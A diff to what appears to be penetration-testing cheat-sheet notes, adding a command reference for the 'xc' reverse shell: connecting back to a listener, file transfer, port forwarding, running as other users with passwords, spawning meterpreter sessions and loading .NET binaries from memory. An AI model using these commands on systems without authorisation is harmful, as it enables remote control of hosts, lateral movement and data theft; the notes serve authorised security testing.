@@ -544,13 +544,41 @@ x86_64-w64-mingw32-gcc -o test.exe test.c
 
 `xc` is a reverse shell for Linux and Windows written in `Go`. It includes a
 number of basic functionalities: file upload / download, local / remote ports
-forwarding, run as another user, etc. It can also be used on Windows systems to
-load and execute .NET assembly from memory.
+forwarding, run as another user, client auto reconnect, etc. It can also be
+used on Windows systems to load and execute `.NET` assembly from memory.
 
 ```
 # A xct's xc listener must be listening.
 xc.exe <HOSTNAME | IP> <PORT>
 xc <HOSTNAME | IP> <PORT>
+```
+
+Once a session has been established throug `xc`, the following notable commands
+are supported:
+
+```
+# Linux / Windows common commands.
+!upload <SOURCE_FILE> <DESTINATION_FILE> - uploads the specified file to the remote host.
+!download <SOURCE_FILE> <DESTINATION_FILE> - download the specified file from the remote host.
+
+!lsfwd - lists the current ports forwarding.
+!rmfwd <INDEX> - removes the specified port forward.
+!lfwd <LOCAL_PORT> <REMOTE_IP> <REMOTE_PORT> - adds a local port forward (to forward traffic received on the local IP:<LOCAL_PORT> to <REMOTE_IP>:<REMOTE_PORT>).
+!rfwd <REMOTE_PORT> <LOCAL_IP> <LOCAL_PORT> - adds a remote port (to make accessible <LOCAL_IP>:<LOCAL_PORT> on the remote host at <REMOTE_PORT>).
+
+!shell - opens an interactive CMD prompt (cmd.exe) or shell (/bin/sh), that can be exited at will.
+!runas <USERNAME> <PASSWORD> <WORKGROUP | DOMAIN> - restart the session as the specified user.
+!spawn <REMOTE_PORT> - spawns another reverse shell session client on the specified port.
+!met <REMOTE_PORT> - spawns a meterpreter on the specified port (requires a x64/meterpreter/reverse_tcp listener).
+
+# Windows specific commands
+!powershell - starts PowerShell in the session.
+!runasps <USERNAME> <PASSWORD> <WORKGROUP | DOMAIN> - restart / start a PowerShell session as the specified user (similarly to runas but spawn a PowerShell session).
+!vulns - checks for common vulnerabilities using Invoke-PrivescCheck -Extended.
+!net <NET_BINARY> <ARG1> <ARG2> ... <ARGN> - uploads and runs a .NET binary from memory using the specified arguments (if any).
+
+# Linux specific commands.
+!ssh <LOCAL_PORT> - starts the sshddeamon with the configured keys on the specified local port.
 ```
 
 ###### msfvenom reverse shell binary
